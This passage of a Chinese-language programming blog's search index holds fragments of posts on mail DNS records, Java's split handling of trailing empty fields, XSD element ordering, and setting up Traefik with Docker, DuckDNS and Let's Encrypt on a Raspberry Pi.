","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:5:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"相關DNS Resource 調整DNS A：正解 PTR：反解 MX：郵件交換紀錄 TXT record：SPF DKIM MX：讓DNS能正常解析 SPF：是一套電子郵件驗證機制，可指定哪些郵件伺服器有權為您的網域傳送電子郵件。 DKIM：會為每一封郵件加上數位簽名，幫助收件伺服器確認郵件並非偽造，而且在傳輸過程中未遭到竄改。 詳細: DNS資源紀錄(Resource Record)介紹 鳥哥的 Linux 私房菜 – DNS Server nslookup A記錄(正解)\u000bset q=a ptr記錄(反解)\u000bset q=ptr MX記錄(郵件交換記錄)\u000bset q=mx TXT記錄(文字記錄)\u000bset q=txt ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:6:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"nslookup DNS傳播檢查 - Nslookup Tool ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:6:1","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"相關名稱意思 ROKSO、SBL、XBL、PBL、DBL 是什么意思？ – 黄忠 – 博客 ","date":"2020-10-28","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/:7:0","tags":["linux"],"title":"程式發信 mail 的問題整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/"},{"categories":["Linux"],"content":"最近 JAVA 程式遇到一個奇怪錯誤 使用 split 針對 data 做分割 切割符號為 ^ 最後發現是後面空白會合併空白 public class MyClass { public static void main(String args[]) { String str = new String(\"1^^2^^^3^4^5^^^^\"); System.out.println(\"^ 分隔符返回值 :\" ); int index = 0; for (String retval: str.split(\"\\\\^\")){ System.out.println((index++) + \":\" + retval); } } } 得到結果會是 ^ 分隔符返回值 : 0:1 1: 2:2 3: 4: 5:3 6:4 7:5 後面的^資料都是空白的話，都不會在陣列 我一直以為別的程式語言也是這樣 ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:0:0","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["Linux"],"content":"JavaScript \"1^2^3^4^5^^^^\".split('^') // Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ] 等一下，Java 這邊好像是用 Regex 馬上找一下方法嘗試 \"1^2^3^4^5^^^^\".split(/\\^/) // Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ] 結果還是一樣 ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:1:0","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["Linux"],"content":"PHP var_dump(explode(\"^\",\"1^2^3^4^5^^^^\")); var_dump( preg_split(\"/\\\\^/\", \"1^2^3^4^5^^^^\")); 都是 array(9) { [0]=\u003e string(1) \"1\" [1]=\u003e string(1) \"2\" [2]=\u003e string(1) \"3\" [3]=\u003e string(1) \"4\" [4]=\u003e string(1) \"5\" [5]=\u003e string(0) \"\" [6]=\u003e string(0) \"\" [7]=\u003e string(0) \"\" [8]=\u003e string(0) \"\" } ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:2:0","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["Linux"],"content":"結果 Java 處理 Split 機制不太一樣 這邊可以看看 split 可以帶第二個參數 String (Java Platform SE 7 ) ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:3:0","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["Linux"],"content":"String.split()與com.sun.deploy.util.StringUtils.split()的區別 String.split()与StringUtils.split()的区别_卡卡_西瓜的博客-CSDN博客 import com.sun.deploy.util.StringUtils; String s =\",1,,2,3,4,,\"; String[] split1 = s.split(\",\"); // String[] split2 = StringUtils.splitString(s, \",\"); // 1,2,3,4 apache 結果會跟下面一樣 找到我們想要的 org.apache.commons.lang3.StringUtils#splitPreserveAllTokens(str, separatorChar) StringUtils (Apache Commons Lang 3.11 API) org.apache.commons.lang3.StringUtils#splitByWholeSeparatorPreserveAllTokens(str, separator) 歡呼!! Java 有沒有像 Python 一樣的 split？ - \u0008摸鱼 看來還滿多人苦惱這個 ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:3:1","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["Linux"],"content":"詳細解說 有爬到這篇Java 字符串 split 踩坑记 com.google.common.base.Splitter 這個比較是接近我們想要的 ","date":"2020-10-28","objectID":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/:3:2","tags":["linux","split"],"title":"寫程式使用 split 切割不會注意到的陷阱","uri":"/blog/posts/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/"},{"categories":["XML"],"content":"如題 xs:sequence 會檢查 xml tag 順序 xml - how can i remove the ordering from a xsd sequence - Stack Overflow 要排除這個方法要 xs:all 但會遇到 unbounded 不能正常運作 最後找到一篇解決方法 [XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記 \u003cxsd:element name=\"event\" minOccurs=\"1\" maxOccurs=\"unbounded\"\u003e \u003cxsd:complexType\u003e \u003cxsd:sequence\u003e \u003cxsd:choice minOccurs=\"1\" maxOccurs=\"unbounded\"\u003e \u003cxsd:element type=\"xsd:string\" name=\"keyword\"/\u003e \u003cxsd:element type=\"xsd:string\" name=\"except\"/\u003e \u003c/xsd:choice\u003e \u003c/xsd:sequence\u003e \u003c/xsd:complexType\u003e \u003c/xsd:element\u003e 程式過了，太神啦!! 為什麼sequence 裡面可以放 choice ?? 先不管啦!! 又解決這一關 奇怪的事情，開發環境竟然原本用 xsd:sequence 會過(Window) 但在正式環境就不會… 其他相關 XSD 复合类型指示器 XSD/XML Schema 学习笔记完整版 | C_Meng PSNA xml - how can i remove the ordering from a xsd sequence - Stack Overflow [XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記 ","date":"2020-10-15","objectID":"/blog/posts/XSD-%E6%AA%A2%E6%A0%B8%E9%81%87%E5%88%B0-tag-%E9%A0%86%E5%BA%8F%E5%95%8F%E9%A1%8C/:0:0","tags":["xsd"],"title":"XSD 檢核遇到 tag 順序拿掉不能放 unbounded","uri":"/blog/posts/XSD-%E6%AA%A2%E6%A0%B8%E9%81%87%E5%88%B0-tag-%E9%A0%86%E5%BA%8F%E5%95%8F%E9%A1%8C/"},{"categories":["Linux"],"content":"最近在樹莓派使用 Docker 服務多 常常設完一個服務，我就要去Virtual Server 設定一個 port 最後想到可以架一個 Server 做反向代理 這時候我想到 nginx 和 caddy caddy 又可以幫我換 letsencrypt 憑證 最後看到這篇用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY 我要介紹另外一套工具叫 Traefik，這一套也是用 Go 語言開發，而我推薦這套的原因是，此套可以跟 Docker 很深度的結合，只要服務跑在 Docker 上面，Traefik 都可以自動偵測到，並且套用設定。透過底下的範例讓 Traefik 串接後端兩個服務，分別是 domain1.com 及 domain2.com。 好像能試試看喔 ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"事前準備 ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"docker-compose 我發現我樹莓派沒安裝 docker-compose sudo pip3 install docker-compose 安裝就這麼簡單 ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:1:1","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"修改舊的 dockerfile 發現有人做過 Docker 与 Traefik 助微服务腾飞 - 后端 不過版本是1.3.8 現在出到 2 了 想使用新版本 看一下舊版的 dockerfile 只是下載直接執行 rpi-traefik/Dockerfile at master · hypriot/rpi-traefik PS: Dockerfile ADD 可以放 http 以外，他可以放 gz 連結，會自動解壓縮 Dockerfile COPY 和 ADD 指令區別和使用規則 - Lishude’s Web Note 上面的命令會導致foo.tar.gz歸檔文件的內容被解壓到容器的/ tmp目錄中。 有趣的是，URL下載和解壓功能不能一起使用。任何通過URL複製的壓縮文件都不會自動解壓縮。 Dockerfile:ADD VS COPY ADD的另外一個特性是有能力自動解壓文件。如果參數是一個可識別的壓縮格式（tar, gzip, bzip2, etc）的本地文件（所以實現不了同時下載並解壓），就會被解壓到指定容器文件系統的路徑。 ADD /foo.tar.gz /tmp/ 上述指令會使foo.tar.gz壓縮文件解壓到容器的/tmp目錄。 URL下載和解壓特性不能一起使用。任何壓縮文件通過URL拷貝，都不會自動解壓。 目前ADD指令有點讓人迷惑，有時候解壓文件，有時候不解壓文件，如果你想拷貝一個壓縮文件，你會以為地解壓。如果文件是某種不能識別的壓縮文件，如果你想解壓，你又會意外地複製它。 docker Dockerfile指令ADD和COPY的區別，添加目錄方法 - 大自然的流風 - 博客園 FROM hypriot/rpi-alpine:3.6 ADD https://github.com/traefik/traefik/releases/download/v2.3.1/traefik_v2.3.1_linux_armv7.tar.gz /traefik.tar.gz RUN tar zxvf traefik.tar.gz RUN apk upgrade --no-cache \u0026\u0026\\ apk add --no-cache ca-certificates \u0026\u0026\\ chmod +x /traefik EXPOSE 80 8080 443 ENTRYPOINT [\"/traefik\"] 做到後面，我發現有現成的 Image arm64v8/traefik - Docker Hub ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:1:2","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"Raspberry PI 安裝 traefik docker build . -t traefik ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"建立 network docker network create traefik_network ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:2:1","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"建置 docker-compose version: '3' services: traefik: image: traefik command: --api.insecure=true --providers.docker ports: - \"80:80\" - \"8080:8080\" volumes: - /var/run/docker.sock:/var/run/docker.sock networks: - traefik_network networks: traefik_network: external: true ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:2:2","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"建置 whoami version: \"2\" services: whoami: image: hypriot/rpi-whoami networks: - traefik_network environment: - constraint:hypriot.hierarchy!=leader - PORT=8000 labels: - \"traefik.backend=whoami\" # - \"traefik.frontend.rule=Host:whoami.docker.localhost\" #2.3.1 上面設定好像會無效 - \"traefik.http.routers.router0.rule=Host(`whoami.localhost`) || PathPrefix(`/whoami`)\" - \"traefik.port=8000\" networks: traefik_network: external: true ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:2:3","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"測試方法 ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"方法1:修改hosts檔案 /etc/hosts 127.0.0.1 whoami.localhost ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:3:1","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"方法2: curl -H xxx curl -H Host:whoami.localhost http://192.168.1.1/ Docker 与 Traefik 助微服务腾飞 - 后端 裡面適用這個方法 推薦使用這個，這樣就不用做多餘的設定 舊版本差異 Traefik v1 to v2 - Traefik traefik 简易入门 | 个人服务器运维指南 | 山月行 arm32v6/traefik - Docker Hub Traefik 用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY 10 分鐘內用 Traefik 架設 Drone 搭配 GitHub 服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY 个人网站实现方案更新：Traefik 反向代理、与 NAS 共用 Wildcard 证书等 – Blanboom 當我們訪問集群內部服務，如數據庫，緩存，traefik Dashboard，gitlab 時，如果直接暴露在公網中，則會造成很大安全隱患，此時我們應該如何處理呢？ traefik 簡易入門 | 個人服務器運維指南 | 山月行 一文搞懂 Traefik2.1 的使用_River’s Site - MdEditor 使用 Docker 和 Traefik 搭建 GitLab （前篇） - 知乎 在Docker Swarm上部署Traefik2.x - 简书 ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:3:2","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"traefik 綁定 lets wildcard wildcard 只能用 dns chang ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:4:0","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"註銷舊有憑證方法 沒用的跳過 certbot revoke –cert-path /etc/letsencrypt/archive/${YOUR_DOMAIN}/cert1.pem 不過後來沒是成功 我先把nextcloud 綁下來 感覺不能直接這樣做?? 後來想說直接用新的 url ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:4:1","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"設定 acme.json # 在docker-compose.yml 路徑 touch acme.json \u0026\u0026 chmod 600 acme.json 設定 traefik docker-compose 參考這個traefik_duckdns/docker-compose.yml at master · KnicKnic/traefik_duckdns 對應我的 docker-compose 做修改 #your duck dns token DUCKDNS_TOKEN= #your duck dns subdomain (not the full domain) #use \"test\" not \"test.duckdns.org DUCKDNS_SUBDOMAIN= version: '3' services: updateDuckDNSIP: # used to update duckdns # if you have a static IP, yu can comment this out # using busybox due to it having an image for almost every platform image: armhf/ubuntu command: /bin/sh -c \"apt update -y \u0026\u0026 apt install curl -y \u0026\u0026 while true; do echo url=\\\"https://www.duckdns.org/update?domains=${DUCKDNS_SUBDOMAIN}\u0026token=${DUCKDNS_TOKEN}\\\" | curl -k -o duck.log -K -; sleep 300; done\" restart: always labels: - \"traefik.enable=false\" traefik: image: traefik command: - \"--api.insecure=true\" - \"--providers.docker\" - \"--entrypoints.web.address=:80\" - \"--entrypoints.web-secure.address=:443\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge=true\" - \"--certificatesresolvers.letsencrypt.acme.email=xxxxx@gmail.com\" - \"--certificatesresolvers.letsencrypt.acme.storage=acme.json\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.provider=duckdns\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.delaybeforecheck=0\" ports: - \"80:80\" - \"443:443\" - \"8080:8080\" volumes: - /var/run/docker.sock:/var/run/docker.sock - ./acme.json:/acme.json networks: - traefik_network environment: - DUCKDNS_TOKEN=${DUCKDNS_TOKEN} labels: - \"traefik.enable=false\" - \"traefik.http.routers.traefik.tls=true\" - \"traefik.http.routers.traefik.tls.certresolver=letsencrypt\" - \"traefik.http.routers.traefik.tls.domains[0].main=${DUCKDNS_SUBDOMAIN}.duckdns.org\" - \"traefik.http.routers.traefik.tls.domains[0].sans=*.${DUCKDNS_SUBDOMAIN}.duckdns.org,${DUCKDNS_SUBDOMAIN}.duckdns.org\" networks: traefik_network: external: true 這邊有個小技巧，使用搭配 .env 可以用 docker-compose config 看看有沒有設定到 certresolver 的 letsencrypt 是看自己命名的名子certificatesresolvers.letsencrypt.acme.dnschallenge whoami version: \"2\" services: whoami: image: hypriot/rpi-whoami networks: - traefik_network environment: - constraint:hypriot.hierarchy!=leader - PORT=8000 labels: - \"traefik.backend=whoami\" - \"traefik.http.routers.whoami.rule=Host(`whoami.xxxxx`) || PathPrefix(`/whoami`)\" - \"traefik.http.routers.whoami.tls=true\" - \"traefik.http.services.whoami.loadbalancer.server.port=8000\" networks: traefik_network: external: true ","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:4:2","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"問題整理 port is missing traefik_1 | time=“2020-10-18T12:15:24Z” level=error msg=“service \"seafile\" error: port is missing” providerName=docker container=seafile-7d40e43962df0ec1ca3af66d553c7ae5b81364497bb5f4f2c77597c95d210370 要開隨一 port? 就能解決 原本是用 traefik.http.services.seafile.loadbalancer.server.port=80 但可能也不是應該用這種方式 有更好方式再補充 去控制 port 不是用 traefik.port 查看官方文件Docker - Traefik Ports detection works as follows: If a container exposes only one port, then Traefik uses this port for private communication. If a container exposes multiple ports, or does not expose any port, then you must manually specify which port Traefik should use for communication by using the label traefik.http.services.service_name.loadbalancer.server.port (Read more on this label in the dedicated section in routing). exposes 就是 docker 對外設定的 port EXPOSE \u003cport\u003e [\u003cport\u003e/\u003cprotocol\u003e...] 難怪…，nextcloud seafile 都需要設定 traefik.http.services.seafile.loadbalancer.server.port=80 https 導向問題 進去 nextcloud https 網站時候 會發現進不去 內層服務強制 https 取消 Container 取消關聯 Backend: Docker - Træfik docker run -d -p 8000:8000 -p 9000:9000 -l “traefik.enable=false” –name=portainer –restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:alpine@sha256:f13f14be723c848e119fa8d85c932dbcc0cbe3cfe09e784ceb09adefa248ccd1 HTTPS redirection (80 to 443) 待確認 –entrypoints.web.address=:80 –entrypoints.web.http.redirections.entryPoint.to=web-secure –entrypoints.web.http.redirections.entryPoint.scheme=https –entrypoints.web-secure.address=:443 這邊要注意 entrypoints.web-secure.address 裡面的命名 同時使用 http 和 https 反向代理 用 nginx , apache 相關反向代理 相信不用處理是否要 http , https 預設就可以了 但我發現這邊不行 後來看了官網文件Routers - Traefik Routers for HTTP \u0026 HTTPS If you need to define the same route for both HTTP and HTTPS requests, you will need to define two different routers: one with the tls section, one without. ## Dynamic configuration [http.routers] [http.routers.my-https-router] rule = \"Host(`foo-domain`) \u0026\u0026 Path(`/foo-path/`)\" service = \"service-id\" # will terminate the TLS request [http.routers.my-https-router.tls] [http.routers.my-http-router] rule = \"Host(`foo-domain`) \u0026\u0026 Path(`/foo-path/`)\" service = \"service-id\" 簡單說就是要寫兩個 router Docker Label 設定方法 labels: - \"traefik.backend=whoami\" - \"traefik.http.routers.whoami.rule=Host(`whoami.ooo.duckdns.org`) || PathPrefix(`/whoami`)\" - \"traefik.port=8000\" #- \"traefik.protocol=http\" default http - \"traefik.http.routers.whoami-https.rule=Host(`whoami.ooo.duckdns.org`)\" - \"traefik.http.routers.whoami-https.tls=true\" traefik docker 設定小記 這邊主要是 traefik 的 docker 設定 提幾個我覺得驚奇重要 endpoint 指定 docker socket file 路徑Docker - Traefik exposedByDefault 單一 port 可以不用設定連到是因為這個關係 預設true defaultRule Docker - Traefik Default=Host({{ normalize .Name }}) 建立 docker 最自動產生 docker router 名稱原來是這邊來的 設定 BaseAuth 產生 帳號/密碼 Note: when used in docker-compose.yml all dollar signs in the hash need to be doubled for escaping. To create user:password pair, it’s possible to use this command: echo $(htpasswd -nb user password) | sed -e s/\\$/\\$\\$/g BasicAuth - Traefik 在线 htpasswd 生成器 - \"traefik.http.routers.router1.middlewares=test-auth@docker\" - \"traefik.http.middlewares.test-auth.basicauth.users=test:$$apr1$$wB4YY5ua$$EocdCl08mI3Pk.6nItqZC/,test2:$$apr1$$2n2YpbTP$$c.FBjTJcfU0FkFZ4u912G/\" 從檔案讀取帳號密碼 labels: - \"traefik.http.middlewares.test-auth.basicauth.usersfile=/path/to/my/usersfile\" test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/ test2:$apr1$d9hr9HBB$4HxwgUir3HP4EsggP/QNo0 openvpn 憑證 PiVPN OpenVPN Access Server \u0026 Let’s Encrypt | Medium SnowMB/traefik-certificate-extractor: Tool to extract Let’s Encrypt certificates from Traefik’s ACME storage file. Store traefik let’s encrypt certificates not as json - Stack Overflow OpenVPN Access Server Letsencrypt ldez/traefik-certs-dumper: Dump ACME data from Traefik to certificates OpenVPN with Traefik 2.2 using UDP · Jurian Sluiman Traefik, OpenVPN and Direct Container Connections on Docker Swarm authelia/authelia: The Single Sign-On Multi-Factor portal for web ap","date":"2020-10-13","objectID":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/:4:3","tags":["traefik"],"title":"在 Raspberry PI 架設 Traefik 初體驗","uri":"/blog/posts/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"之前使用NextCloud 使用docker簡易安裝筆記 | 程式狂想筆記 登入頁面就要等了老半天 進去聽歌點一首歌也要等一下 原本以為他上傳檔案有做加解密 但我後來發現 NextCloud PI 預設沒打開 把幾個套件拿掉也一樣慢 不過也又 NextCloud 一陣子 因為他竟然有支援 Chrome Media Hub 可進行上一首、下一首 Manage audio and video in Chrome with one click 可算非常方便 但最近我覺得太慢了 原本以為是 CPU 的問題 後來看到官網說是 IO 速度太慢 所以我最近在找找有沒有替代方案 ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 